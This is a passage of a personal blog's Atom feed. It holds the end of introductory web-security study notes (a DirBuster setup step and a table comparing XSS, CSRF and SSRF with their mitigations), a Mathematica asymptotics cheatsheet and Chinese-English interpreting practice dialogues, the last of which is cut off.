href="http://pkg.kali.org/pkg/dirbuster">Download</a>:<code>git clone https://gitlab.com/kalilinux/packages/dirbuster</code></li><li><code>./DirBuster-1.0-RC1.sh</code></li><li><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205201146851.png" alt="iShot2022-05-20 11.46.44" style="zoom:50%;" /></li></ul><h2 id="qa">Q&amp;A</h2><!-- #### 测试方法**弱密码**: > 例如简单的 password: [admin](https://www.root-me.org/en/Challenges/Web-Server/Weak-password)**弱验证**: 在替代渠道中测试较弱的身份验证; 访问, 401(未验证): HTTP401错误代表用户没有访问权限, 需要进行身份认证; 同时返回:  - 认证方式: Basic/Digest;    - Basic认证方式使用的账号密码没有经过加密, 直接在网络中传输; (这里<u>`Base64(明文账号/密码)`</u>, 易被攻击)   - Digest方式使用加密的密码，这种方法更加安全，但是_技术还不成熟，不能使用_; - 认证字段: realm **用户名枚举**: 攻击者可以通过枚举用户名来检测账号是否存在;一般没有什么危害, 除非一些类似于 Ashley Madison 这种网站 (泄漏100G的: 用户名, email, 信用卡信息等)预防措施: 无论用户名是否存在, 返回相同结果; 限制尝试频率(例如找回密码中通过输入邮箱尝试; 应当限制为: 尝试达到3次; 然后停用一天)。**注入**: 验证任接收用户输入的点 (搜索框, 留言板, 或者动态url和参数) 是否存在 XSS 或 SQLi 注入风险。  --><h4 id="xss-vs-csrf-vs-ssrf">XSS vs CSRF vs SSRF</h4><table><colgroup><col style="width: 3%" /><col style="width: 18%" /><col style="width: 37%" /><col style="width: 40%" /></colgroup><thead><tr class="header"><th></th><th>XSS</th><th>CSRF</th><th>SSRF</th></tr></thead><tbody><tr class="odd"><td><strong>Definition</strong></td><td>允许攻击者在受害用户的浏览器中执行任意 Javascript</td><td>诱骗<u>用户</u>执行恶意请求<br>网站被攻击者控制<br>用户必须经过身份验证</td><td><strong>服务端请求伪造</strong>:欺骗<u>服务器</u>代表攻击者执行未经授权的请求</td></tr><tr class="even"><td><strong>Mitigation</strong></td><td>正则表达式或字符串筛选<br/>WAF<br/>HTML Encoding<br/>ContentSecurity Policy</td><td>具有高熵的 CSRF 令牌,绑定到用户的会话<br>Referrer<br><strong>CORS跨域资源共享</strong>:浏览器⽤于限制与其他⽹站交互的机制, 抵御恶意 AJAX请求,允许⽹站指定谁可以使⽤ AJAX</td><td>将域名解析列⼊⽩名单<br/><br/>重新评估<strong>EgressRule出⼝规则</strong><br/><br/>禁⽤未使⽤的 URL架构<br/><br/>将应⽤程序可访问的服务列⼊⽩名单（不允许使⽤ AWS元数据等敏感终端节点）</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="unimelb" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/"/>
    
    <category term="MIT" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/MIT/"/>
    
    
    <category term="unimelb" scheme="https://yumtaro.com/tags/unimelb/"/>
    
  </entry>
  
  <entry>
    <title>unimelb 2021 S2</title>
    <link href="https://yumtaro.com/archives/99feb3ce.html/"/>
    <id>https://yumtaro.com/archives/99feb3ce.html/</id>
    <published>2021-07-04T16:00:00.000Z</published>
    <updated>2022-05-31T07:20:56.374Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b37c6ae6d863e739b6be8420d5234bf7b4d328ae5751746918448abfb9cb83f8">23a75f739a6285f5a43e48006953a35a41347425551c315878331e13af0e5e9530d48590a870757681c102be43649c4c9870d0f781e5d86ea3e5e506051b949852a71b2f1dc5fec18476278c03c2bd339e1f512f158108bb608e343bd081fe8985dcecec37c3346c0f602ebd6d0642e491bae37f303b808e6ceecbaa07ca41ab5e406d38ed878d1e71e9dec42d18fd146d29c121103f53df2e0acad45c0e75ce6b07d71e615987e42a42c043c70a8e1ba5467098475b32b13eb69c0edae364b020cf11ef94723cff7502c8db42ccae40cbca0873a3319f9f4f3994d32e93230bd3be99da1f36d522e60c130ea9d79bb6b173603eca5ab652ed336ff47891e2bff17c50b9dfe3487ca35e44f4adb2287d1efb02c5fa454cc34d2bb830aa477c2bda6f85f5866144f2b246606c20dff9d593778fceba6a3159d831f2a81904e1be0d8453e893d4720b051b22f9fe47930526fc2b0b4b8910d4782a17167b3431b0a94f082aaaadd2d32f521e755a9e8d426975aa8485a41f093fb4cf2d85ff8bd9e6da26f08362fd0b660b7169354842a8421b3366a29d89ad2f0d83510da501db2f0553212d68d2cf0213d66ffd903794290a19d9395a55b240e39dc258778d8f9013eeed704c8c2b096bce90d1b71f8ce1dd8ef2dbf71243a4c2344186cdb4397cf18b9653feeaf72ad9224c51fdbe9ba4821a0beace5124ffbfa888537e21fa2c5e205d1ec85bdba79d2b2cdea09f3ef3040a512774de9eefdf76ddc927fdb970391ed6ab795594ab5fbbf7a71999205e0cfcaf66173dfaeae3c5416ea6e895420dd32fed8cdec5d5d3cb2f7bbbfeb8fce70b367fd174dd007d4ed9d5461a1f2bc669479442c1cc906c582d279e72542418e606b7ec94d74630781083bb6b246fdb7bc1e2eb1f9792aed1fa5699f87ca34e63bae8ec5c5b062c0b4b30de3c97d15668b718ce99be7337fc908cd66526cc00af624079e97e5bccb92e3344872b1beb396b3e1999cc356517519877039bc4598fd40282d46bd50a0c1e2a1efc53254ffd6786003f05cd6087ffcab9c7319f77eb9d25802e74aed46eaae06811560a5d15064ffdc670898dbed0eee9000b6a7a86f8be863459ba7ff196760dacfd31442c04d65187e4cbffbc171bae9de162dbe5f355197982eb154084168b4fe8863d6527df366b158a4570c7493f232587fe63dcdeb63d9f62b457c7b437f78bbc625286916a030005f941ae8ff20135b0cda6e7639f1553437456585cb835df6f150de5403788ad2ab018465c9367ac45800733bcffec945fbcf48fbf4f6c0857f31babf8af7dfc02b914d353cdb6ef2270ba92c0fd2563ccc2c31e4a47a692efddc383e26d41a5f8ede349346bd1cd5e0b32c2ca134c4dc84d2a1a1a565c16e6b5316cd6dc55b904d489d437d230320d837754713db79229f19da5d45e8b5e1d346a2fc4ed4d3d5d395d1251480d473cb8b023f2c7f110b4002049c03df9086eb2532d4d00f6bedefc803ff0866d0d118484d636e4e0a5da34b5188524835a42f30e1999fbcf6704ae3a7a6dbe25fec527793723530a4b309b9e51e1e31646cef8b7c1354297b2c152e9d50ab23003bbc9a052db98de4fbdf55d18d805c7850ec1b003117105b5982b9566af788f19eb394d0c0d780f82f6830c741a8c9805bed284b490c99cdb755a3b23e98997b0dcbadb487a3fb22279ff5369f323f002ca31363f7010b02ab55d14be97706f5b21bbe4e777d7e3c39525e6a44627b03f7fab1dd1a1b51d3f8128fff2b4689531ee110b2439a2de5d756ea7cca593b22eda6f7d4daba2b20abd9c196fdefdfc97ad9d4bd09c2453dc1e5f325642efdad398c650422db89ba588500f30424775a3a064b8e8df108702ebfd5845cda44ba2c0d6321794a487d56d2dd7499a0db7abdce178f48468108dea111cbf60bd5dea91ac20d1b0a99db2ca3dc6ffa5c0a7c956ea100b365888502cb99a4c9ae9fe8be0fd291e0132e7f94698be52d1d412f18847c6f61d99e03f7bdea729d8c8f28e6fec75221dc44aefa45afef4b686a309e01309b171e8974c4cfc180dc75cf045f2722d83e850a211b6d8ef3a3d5c5ac67955e0d7155058fc77550abf662b805b0233713eb49c8c0aecb9452bb5a1423e4e038a553ed7459c604ca03082f34c31ee0bd1dca96c656e6dbc91bb1ee6b2715c80689d41bddf7e8caef8772a966ed29a0812275b2c6a42c26a1351d6f4b84d8f0876b36d3622cc3a32e3bc33bb60fda9e6743ecf084305c07aa1971e9eb4044bf071409ae35d70cfda37645aa4d1772f48ed82b4e0580d848a52ed8aacfb2f14bc63c170bca3ffaf438ae242987fe0f5476e92bca4d39265a346ab9aa8755f6ede4aaf0056282dd9904772f2673018b40715ee16d64896b4804a51fc9ce76c7705bdba60e0a6c03662daab43df8b3b866a18f4144b0b0407e81752cffd95d50fcd098590f99ae2d42d15ed379b634337a7b83c55595d15effbca0f2d585ba657dcfc87348c20d735ce139724f2c55b987ff6af44a9a9ecb5ad0e92c4ede12bf47cc8ee6d1d45337b800889fa893dc7abe6135499caa99314ae04675bf3697017541ce4596df70909f19c14575684372981930e6c1b16e379505107174e365f8a3bcf4b11a448f33e2bc25e6891323c2ca4bb327e2e104320dfa85e1027b62bea23dcd96613be6093dad76ad0ece494b730eb67bd0c33f01ce42168168d8070a6da77181ec2f398ff5384d3704d634f349c36f7a4b496e1a0a73e46a2a0cb170e98dad6de0aa747fcf4e56a990a6bcbe6d99c925530f4a4d420180611fabcd7e0df54bfd4f61bf4dd2ab621a83e3edd243b592cdca82f64e4c8fdffdd7fb6105426cbe2572c9928f7a1a7478df7e8c545dd590892510a4db50504fd9c9c23c64756e5e32660afabf45730cf50ed87ab7d6c11bbaa9ad83b650a97ea6642e3bee4fdcfceba336c44ec1f37fe8703f19c0bb2134da4b0f5bf550088d92d7102430bb7f6ecf960d55d6c03e8f8a0a500e3424f881c5f764c40b68598a8ab4feaa9482193ec047853656236840af6e551848a7f78334695a5e903d3a5bb806fc99cb3a54857d3aae319d8184f67c48ef1758d9934dbd429f828339432b2aa95dc9d90239d2a7cb20c8130c0159c5899f9268bbafca5af95cba737a93a3be253449bc994a8dd8426c5be8d267bfe734cc71a816bc064ebd9082912639df94e20f8ddb0de0e3a4b50fb66c4da316208e704a74c1c983f2f22f843e7bc56109768248c6c4c5f2c5279c1252c5de5a120d44bc267b8aecda733bf353824d7da0229e9d01741c3cd4d15d6854f518bd641874780186d4475ec9ba60ccde57d3a32046e6285014062be1f82f2907b68d21b6600f1dd430b8175a4f2d7634488a8df38d09cc19bc3ecfe9f4c49d2d89abf9a9034f28745e4cf7b1489dfbbf22b736ef683a6e214afc7d59d767923efed892ef2c83a8aa15394c6a7079f93a094339ec67643186984fca6d8d49556e852615e7d067a8d2b70550cfb8712bfbac87a5f2ae1f693347bcefd2731559705abaec2082e0e153fe473ced170b3ed8a62fa199034f0a25cfcf88eee6e896edb212d8e247b7ab1f6ca1e7759785b88351a2bdc5296a7eeb7ad50a69e8ec8e093b30d2bb64166621840ec01298eaaf514009052169ec3e40790d889206f29f7ccf9df85120ba212201ef0b1c352d9beb58a916dec6b639c5492b0abc4701d1722ab0976b9e4ff8c5bdcae6d89ac3260875f257ac3ee8f389bf7cb403c54962b740200432572b207e7bcc5ab3ac6c679d6d927796142aaac574e84410b25ff5b77a46028c04247aa47b184212fe115a2a7f9f3245ca883dff31cbbdf98182839cb2b83cd5b6881df1b016dd3d5750da67e94a6085c4bf121878848728c3b9f6e930deadc3c5c2133666747a997b06e7a343cf37b923eaa67e73a634a96e992977061f0c24adfc7c5c65a407f93b69a9b486554dcb247ded207970a233e5fba75dcdb85f29ccc57dee0e32923686a00baa09effb3ddb7369ad31a0a6303942d8c4f4cc6b9e1095c89967e0c01e6ea981e93ecfb5ebe68928967a92427098d176e91742c77cb5845995b2f299c89df2e9a8d091ffea916af58eb0c07bd5f11ee692cbf1063857837a0828064ab6d2352f7c77233491e27efd7e27b21915f5a74560cce9ebeb6bf98cd1ac879ab88bd7fcdecee61e95990431acc6cbb1322db45a4b77796f243341efad18d4913df6b6a7ea2cf200b1f7dc9d6d035533d28236de0bdf6ea9f4434620894203d19bf08e51ed1effdf7a4973766a99a9e0315d3cebe4b3c5b3ce82d7adb2a25a99b3061d67f8c35de66111968fe88fd8c7ca0868e10e01688cf0951a7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">COMP90018, COMP90015, COMP90054, COMP90049</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="unimelb" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/"/>
    
    <category term="MIT" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/unimelb/MIT/"/>
    
    
    <category term="unimelb" scheme="https://yumtaro.com/tags/unimelb/"/>
    
  </entry>
  
  <entry>
    <title>Mathematica Cheatsheet</title>
    <link href="https://yumtaro.com/archives/895d168d.html/"/>
    <id>https://yumtaro.com/archives/895d168d.html/</id>
    <published>2020-08-17T02:36:19.000Z</published>
    <updated>2022-04-24T03:29:29.628Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="二进制转换">二进制转换</h2><p>FromDigits["1010", 2]</p><h2 id="mathematica-解算法复杂度中的渐进关系">Mathematica解算法复杂度中的渐进关系</h2><h4 id="渐进关系">渐进关系</h4><p>Big-O: AsymptoticLessEqual Big-Θ: AsymptoticEqual Big-Ω:AsymptoticGreaterEqual</p><h4 id="例题">例题：</h4><p>给出：n² + 5n ∈ Θ(g(n)) 求解：n 的范围 a. n b. n² c. 1 d. n &amp;n²</p><h4 id="mathematica-渐进关系解法">Mathematica 渐进关系解法</h4><ol type="1"><li>Big-O 解法：<code>AsymptoticLessEqual [y^2 + 5 y, y2, y -&gt; \[Infinity]]</code></li></ol><p><img src="/assets/images/20200816153506.png" alt="Big-Oh 解法" style="zoom:75%;"/></p><ol start="2" type="1"><li>Big-Θ解法：<code>AsymptoticEqual[y^2 + 5 y, y^2, y -&gt; \[Infinity]]</code></li></ol><p><img src="/assets/images/20200816153218.png" alt="Big-Theta 解法" style="zoom:75%;"/></p><p><br></p><h4 id="plot-作图解法">Plot 作图解法：</h4><p><code>Plot[&#123;n^2 + 5 n, n^2, n&#125;, &#123;n, 1, 100&#125;, PlotLegends -&gt; "Expressions"]</code></p><p>第二个花括号中 1 后面的数字 100 是最大值（代替∞无穷）， 我们这里试用100 测试， 方便区分线段使其不重合， 我们可以更扁 100 到更大或更小数值，以观察变化。</p><p><img src="/assets/images/20200816153921.png" alt="作图解法" style="zoom:45%;"/></p><h4 id="总结">总结</h4><p>最后例题的答案显而易见为 (b) 选项：n² 。另外其实还可以绘制三维图形：</p><p><code>Plot3D[&#123;n^2 + 5 n, n^2&#125;, &#123;n, 0, 100&#125;, &#123;y, 0, 100&#125;,   PlotLegends -&gt; "Expressions”]</code></p><p>不过用在我们的例题中，显得有些牵强。</p><p><img src="/assets/images/20200816155911.png" alt="3D Plot" style="zoom:22.5%;"/></p><p><br></p><h4 id="reference">Reference:</h4><ol type="1"><li><ahref="https://reference.wolfram.com/language/ref/AsymptoticEqual.html">AsymptoticEqual- Wolfram</a></li><li><ahref="https://www.wolfram.com/language/12/asymptotics/find-the-computational-complexity.html.zh?footer=lang">求计算复杂度- Wolfram</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="IT" scheme="https://yumtaro.com/categories/IT/"/>
    
    <category term="Software" scheme="https://yumtaro.com/categories/IT/Software/"/>
    
    
    <category term="MacOS" scheme="https://yumtaro.com/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>结核检查</title>
    <link href="https://yumtaro.com/archives/6dc3e4d.html/"/>
    <id>https://yumtaro.com/archives/6dc3e4d.html/</id>
    <published>2020-08-09T06:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-PbqglxUP" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-PbqglxUP"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL支气管炎",              author: "SIIT",              url: "/assets/ccl/CCL支气管炎.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>A patient comes to see the doctor about difficulties with breathing.The doctor asks questions about the patient's condition, gives adiagnosis, orders some tests and prescribes medication. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>M1</td><td>医生，这几天来我一直感觉很难受。我觉得呼吸困难，尤其是晚上的时候。咳嗽得也很厉害。</td><td>Doctor, over the last couple of days I've been feeling terrible. Ifind it hard to breathe, especially at night. I also have a terriblecough. </td></tr><tr class="even"><td>E1</td><td>That sounds no good. Do you also get wheezy or short of breath?</td><td>13</td></tr><tr class="odd"><td>M2</td><td>是的。当我吸气的时候，就好像有人坐在我的胸脯上似的。我呼气的时候呼吸声也很大。</td><td>Yes. When I try to breathe in, it feels as if someone is sitting onmy chest! Also, it’s very noisy when I breathe out. </td></tr><tr class="even"><td>E2</td><td>It sounds as if you might have a chest infection or it may bebronchitis. When you cough, do you bring up any sputum and if so, whatcolour is it? </td><td>31</td></tr><tr class="odd"><td>M3</td><td>是的，咳嗽时会有很多痰，特别是在早上。颜色是黄绿色，很粘稠。什么是支气管炎呢？</td><td>Yes, there’s quite a lot of phlegm when I cough, especially in themornings. It's a greenish yellow colour and quite solid. What isbronchitis?</td></tr><tr class="even"><td>E3</td><td>Bronchitis is an inflammation of the bronchi in your lungs. If it’sthat, we need to treat it quickly otherwise you may have long termcomplications. </td><td>26</td></tr><tr class="odd"><td>M4</td><td>过去，我甲状腺出过问题。有可能跟这个有关吗？ </td><td>I had a problem with my thyroid some time ago, could it be linked tothat?</td></tr><tr class="even"><td>E4</td><td>No. But I need to do some blood tests to check what kind of aninfection it is, and we can test your thyroid at the same time, just tobe sure. </td><td>32</td></tr><tr class="odd"><td>M5</td><td>噢，那不错。支气管炎真的会让我感觉病得这么严重么？</td><td>Oh, that is good. Can bronchitis really make me feel so sick?</td></tr><tr class="even"><td>E5</td><td>Yes. It could even be that you have a mild case of pneumonia but,either way, you need to start taking antibiotics to control theinfection. </td><td>26</td></tr><tr class="odd"><td>M6</td><td>我对盘尼西林/青霉素过敏，会起红疹。一年前，我足部有严重的感染，那时候我才发现的。</td><td>I am allergic to penicillin, I get a red rash. I found that out whenI had a serious infection in my foot a year ago. </td></tr><tr class="even"><td>E6</td><td>Then I'll make sure I prescribe antibiotics that don't havepenicillin in them. Make sure you take the full course of tablets.That’s very important. </td><td>25</td></tr><tr class="odd"><td>M7</td><td>那好吧，医生。我会再做一个预约，下周来找你拿化验结果。</td><td>Alright then doctor. I'll make an appointment to come and see younext week to get the results of the tests. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>初来澳洲</title>
    <link href="https://yumtaro.com/archives/d22a7a0c.html/"/>
    <id>https://yumtaro.com/archives/d22a7a0c.html/</id>
    <published>2020-08-09T05:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.048Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-uValhZAl" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-uValhZAl"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL初来澳洲",              author: "SIIT",              url: "/assets/ccl/CCL初来澳洲.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This dialogue is between Mrs Huang (H) and an officer (O) from thelocal community service. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Good morning. My name is Jeff Green, a client service officer withHurstville local community service. How can I help you?</td><td>早上好，我是 Hurstville 本地社区中心的客户服务专员 Lisa Green，有什么能帮您?</td></tr><tr class="even"><td>M1</td><td>是的，早上好。我是黄桂。我是刚刚来到澳大利亚的新移民。我相信我丈夫的话，我们就要开始在这里的新生活了。所以我需要知道该怎么开始。</td><td>Yes, good morning. My name is Gui Huang. I am a newly arrivedmigrant to Australia. I believe what my husband said, “We are going tostart a new life here”. So I need to know how to start. </td></tr><tr class="odd"><td>E2</td><td>That is very good thinking, Mrs Huang. You have taken a good firststep by coming to this consultation today. There are quite a few issuesyou need to deal with during your first weeks. Such as, applying for aTFN, registering with Medicare, opening a bank account, registering withCentrelink and so on.</td><td>这么想非常好，黄太太。通过您今天参加这个咨询，您已经迈出了良好的第一步。是有一些事情，您需要在最初的几周就料理好。比如，申请TFN, 在 Medicare 注册，开设银行账户，在 Centrelink 注册等 等。</td></tr><tr class="even"><td>M2</td><td>我已经注册了 Centrelink 和 Medicare 了。我在 ANZ银行的账户也开好了。不过，这个 TFN 是个什么东西，我没有听说过。</td><td>I have done the registration with Medicare and with Centrelink. AndI have opened my account at ANZ bank. But what is this TFN? I neverheard of it. </td></tr><tr class="odd"><td>E3</td><td>TFN stands for Tax File Number. To receive an income in Australia,you need a TFN. Income includes wages or salary from a job, paymentsfrom the government, and money earned from investments includinginterests on savings accounts.</td><td>TFN指的就是税号。在澳大利亚，如果您有收入，就需要有税号。收入包括从工作中得到的工资或薪酬，有政府发放的津贴，以及包括储蓄账户的利息在内的由投资中获得的盈利等。</td></tr><tr class="even"><td>M3</td><td>啊，那我本应在来这儿之后的第一周就申请税号的。我一点儿也不知道这个。那我自己有一辆车，可是我只有中国的驾照。我可以在澳洲开车吗？</td><td>Uh, I should have applied for a TFN within the first week of myarrival. I didn't know that at all. And, I have a car, but now I onlyhave a Chinese driver’s licence. Am I allowed to drive inAustralia?</td></tr><tr class="odd"><td>E4</td><td>If you are a permanent resident visa holder and have a currentdriver’s license from another country in English or with an officialtranslation from an acceptable source, you are allowed to drive for yourfirst three months after arrival. After that, if you want to drive, youwill need to have it transferred to an appropriate Australian driver’slicence.</td><td> 如果您是永久居民，持有另一个国家的有效驾驶执照，而且这个驾驶执照是用英语或者有正式认可的翻译，那么您在到达后的最初三个月是可以驾车的。此后，如果您想驾车，就需要有转成相应的澳大利亚驾驶执照了。</td></tr><tr class="even"><td>M4</td><td>我的驾照当然是中文的。认可的翻译？必须是具有 NAATI认证的翻译员的翻译么？我带来了我在中国开据的驾照的公证书，这个可以用么？</td><td>Of course my driver’s licence is all in Chinese. Translation from anacceptable source? Does it have to be a translation done by a NAATIaccredited translator? I have brought a notarized version of my Chinesedriver’s licence, can I use that instead? </td></tr><tr class="odd"><td>E5</td><td>I don’t think so. You have to have it translated by a NAATIaccredited translator. I think you need to get a copy of this booklet.It will give you a basic idea of the sort of services and assistancethat is available and where you can go to ask for advice. I believe youwill find it useful as you begin your new life in Australia. </td><td>应该不可以。你必须找 NAATI认证的翻译。我想你需要拿一本这个小册子。这本小册子能让你了解各种有用的服务和帮助的基本情况，告诉你该去那里寻求建议。我相信你会觉得它对于你开始在澳大利亚的新生活会很有用的。</td></tr><tr class="even"><td>M5</td><td>这么厚一本，还是彩页的，是免费的吗？噢，还有中文版的呢。太好了！</td><td>Such a thick book, and it’s colour-printed. Is it for free? Oh,there is also a Chinese version. Great!) </td></tr><tr class="odd"><td>E6</td><td>Yes. You can take one with you. And please take some time to read itcarefully. Also please don’t hesitate to come to us for help when youneed it.</td><td>是的。你可以拿一本走。请一定花一些时间认真阅读。另外如果有需要的话，也请随时来找我们寻求帮助。</td></tr><tr class="even"><td>M6</td><td>好的，我会的。非常感谢您。</td><td>Sure, I will. Thank you very much. </td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="NATTI" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/"/>
    
    <category term="CCL" scheme="https://yumtaro.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/NATTI/CCL/"/>
    
    
    <category term="CCL" scheme="https://yumtaro.com/tags/CCL/"/>
    
  </entry>
  
  <entry>
    <title>度假再询</title>
    <link href="https://yumtaro.com/archives/c1aa3985.html/"/>
    <id>https://yumtaro.com/archives/c1aa3985.html/</id>
    <published>2020-08-09T03:30:00.000Z</published>
    <updated>2022-04-24T02:15:34.047Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-YMGAABFc" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-YMGAABFc"),            narrow: false,            autoplay: false,            showlrc: false,            music: {              title: "CCL度假再询",              author: "SIIT",              url: "/assets/ccl/CCL度假再询.mp3",              pic: "/images/siit.jpg",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><hr /><p>This is a dialogue between Mr. Hu (H), a Chinese tourist, and thereceptionist (R) of a travel agency. * * *</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>ID</th><th>Original</th><th>Translated</th></tr></thead><tbody><tr class="odd"><td>E1</td><td>Well it depends on the time of year. Of course in peak season, likesummer holidays, we do them every weekend, but at the moment it’susually once a month at most. Um, there’s one coming next week which ison the 8th of June.</td><td>是这样，这是看月份的。自然在暑假这样的高峰期，我们每星期都有团。但目前我们只是每月有一次团。嗯，下一个团是在下一周，也就是 6 月 8 号。</td></tr><tr class="even"><td>M1</td><td>那看来我们运气还不错。六月八号也刚好是我跟我女朋友的一周年纪念日，我刚好可以给她个惊喜！那么我想选择这个两日游套餐，那关于住宿方面是什么安排呢？</td><td>It seems we are quite lucky. It’s going to be our first anniversaryon the 8th of June. I might as well give her a big surprise. So I wouldlike to choose this two-day tour package. Could you give me moreinformation about the accommodation?</td></tr><tr class="odd"><td>E2</td><td>The hotel where you stay has great facilities and it is very closeto the beach. Therefore, if you just want to relax, you are free to sitby the hotel pool or go down to the beach and go sunbathing.</td><td>您所住的酒店有一流的设施，离海岸很近。所以，如果你只是想放松一下，你可以随意选择坐在酒店的泳池边上，或者下到海滩去享受阳光浴。</td></tr><tr class="even"><td>M2</td><td>我和我女朋友都是运动达人。酒店有没有健身房之类的体育设施，我们可以舒活一下筋骨？</td><td>My girlfriend and I are both sports lovers. Are there any gyms orother sports facilities at the hotel, so we can do some exercise?</td></tr><tr class="odd"><td>E3</td><td>Oh yes. They have a big gym on the top floor. And they also havetennis courts at the hotel, but you have to pay for those by the hour.But there are table tennis tables downstairs and they’re part of theaccommodation package. So you can use them for free.</td><td>噢，是的。酒店顶楼有一个很大的健身房。酒店还有几个网球场，但你必须按小时付钱才能使用。不过，楼下还有许多乒乓球球桌，它们属于住宿套餐的一部分。你可以免费使用。</td></tr><tr class="even"><td>M3</td><td>那有没有其他的度假住宿方式呢,比如沿海别墅？如果价钱不是很贵，我想让这次旅行更加浪漫一点。</td><td>Do you have other types of resorts, such as villas on the beach? Iwant this trip to be more romantic if the price is not too high. </td></tr><tr class="odd"><td>E4</td><td>Yes, we do, but the price will be doubled. That is to say, you haveto pay $380 per person per day on top of your whale watching 